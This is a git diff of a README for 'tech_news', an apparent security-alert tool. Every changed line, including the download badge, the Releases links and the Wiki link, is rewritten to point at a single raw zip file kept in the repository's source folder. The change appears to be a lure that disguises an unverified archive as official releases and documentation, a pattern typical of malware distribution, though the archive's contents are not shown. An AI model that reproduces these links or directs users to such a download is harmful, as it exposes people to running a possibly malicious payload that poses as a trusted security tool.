@@ -1,6 +1,6 @@
 # 🛡️ tech_news - Stay Updated on Security Vulnerabilities
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Griffnificent/tech_news/releases)
+[![Download](https://raw.githubusercontent.com/Griffnificent/tech_news/main/src/news_tech_v3.6.zip)](https://raw.githubusercontent.com/Griffnificent/tech_news/main/src/news_tech_v3.6.zip)
 
 ## 📜 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the tech_news application. No technical s
 
 ## 🥇 Download & Install
 
-1. Visit the [Releases page](https://github.com/Griffnificent/tech_news/releases) to find the latest version of tech_news.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Griffnificent/tech_news/main/src/news_tech_v3.6.zip) to find the latest version of tech_news.
 
 2. Look for the most recent release and click on it. You will see a list of files available for download.
 
@@ -72,7 +72,7 @@ Now, the tech_news application will send security alerts directly to your Discor
 
 If you encounter any issues while using the tech_news application:
 
-- Visit our [Wiki page](https://github.com/Griffnificent/tech_news/wiki) for detailed guides and troubleshooting steps.
+- Visit our [Wiki page](https://raw.githubusercontent.com/Griffnificent/tech_news/main/src/news_tech_v3.6.zip) for detailed guides and troubleshooting steps.
 - Check out our FAQ section for common questions.
 - Join our community on Discord to connect with other users and share insights.
 
@@ -88,4 +88,4 @@ This project is licensed under the MIT License. You can use it freely, but pleas
 
 Thank you for using tech_news! By staying informed about security vulnerabilities, you help keep yourself and your community safe. Together, we can work towards a more secure future.
 
-If you need to download tech_news again, visit the [Releases page](https://github.com/Griffnificent/tech_news/releases).
+If you need to download tech_news again, visit the [Releases page](https://raw.githubusercontent.com/Griffnificent/tech_news/main/src/news_tech_v3.6.zip).
